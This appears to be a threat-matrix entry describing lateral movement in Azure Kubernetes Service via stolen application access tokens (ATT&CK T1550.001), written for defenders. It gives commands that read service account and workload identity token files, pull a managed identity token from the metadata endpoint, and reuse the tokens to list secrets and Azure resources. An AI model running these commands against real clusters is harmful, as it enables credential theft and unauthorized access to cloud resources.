# Lateral Movement

### **Lateral Movement in Containerized Environments**

In Kubernetes and container-native infrastructures, adversaries move laterally across nodes, namespaces, or services by abusing legitimate authentication material like **application access tokens**. These tokens are often service account credentials, cloud metadata tokens, or internal secrets used to access APIs and services — allowing attackers to pivot stealthily between resources and elevate control.

#### Use Alternate Authentication Material → Application Access Token (T1550.001)

**Description**:\
Steal and reuse application tokens (e.g., Kubernetes Service Account tokens, Azure Managed Identity tokens, or Azure Workload Identity tokens) to access additional cluster resources, Azure services, or escalate privileges within the cloud environment.

**AKS Example**:\
An attacker compromises a pod running in Azure Kubernetes Service (AKS) and extracts its Service Account token:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

The attacker can reuse this token with `kubectl` or raw Kubernetes API requests to pivot into other namespaces or access secrets:

```bash
curl -k -H "Authorization: Bearer $TOKEN" https://<aks-api-server>/api/v1/secrets
```

Alternatively, the attacker can target the Azure Instance Metadata Service (IMDS) from within the compromised pod to steal an Azure Managed Identity token:

```bash
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"
```

The stolen Azure access token can then be used to interact with Azure services, such as listing resource groups or accessing storage accounts:

```bash
curl -X GET https://management.azure.com/subscriptions/<subscription-id>/resourcegroups?api-version=2021-04-01 \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

If AKS is configured with Azure Workload Identity, the attacker can also extract the federated OIDC token:

```bash
cat /var/run/secrets/azure/tokens/azure-identity-token
```

And exchange it for an Azure access token to assume roles assigned to the compromised identity:

```bash
az login --service-principal --username <client-id> --federated-token <stolen-token> --tenant <tenant-id>
```

